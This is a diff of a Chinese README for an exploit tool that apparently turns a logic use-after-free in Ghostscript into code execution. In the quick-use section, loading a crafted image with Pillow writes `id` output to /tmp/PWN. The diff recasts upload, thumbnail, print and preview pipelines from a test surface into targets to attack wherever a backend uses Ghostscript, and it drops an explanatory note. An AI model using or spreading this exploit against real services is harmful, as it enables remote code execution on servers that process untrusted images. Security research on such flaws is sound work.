@@ -12,7 +12,7 @@ upload2shell的一个带fuzz的版本，支持64-bit LP64下的fuzz，其他架�
 
 这次的是逻辑性uaf，与地址无关，所以可以预先做一个带fuzz的图片，能一次模糊测试大量版本。这才有点24shell的样子。
 
-类似log4j的parser gadget思路：图片/文档上传、缩略图、打印、预览/导入等把不可信内容交给Ghostscript的管线是测试面。
+类似log4j的思路：图片/文档上传、缩略图、打印、预览/导入等都是fuzz面，如果后端用了ghostscript就可以打。
 
 ## 快速使用
 
@@ -26,11 +26,8 @@ with Image.open("/tmp/exp.png") as image:
     image.load()' | python3
 
 cat /tmp/PWN
-# uid=1000(debian) gid=1000(debian) 组=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(lpadmin),114(scanner)
+# uid=1000(debian) gid=1000(debian) ....
 ```
-
-Pillow 的 EPS 插件以 `-dSAFER` 调用 gs；payload 写入 `/tmp/PWN` 后 `quit`，因此
-`image.load()` 可能抛 `UnidentifiedImageError`，`cat /tmp/PWN` 仍可读到 `id` 产物。
 
 ---
 
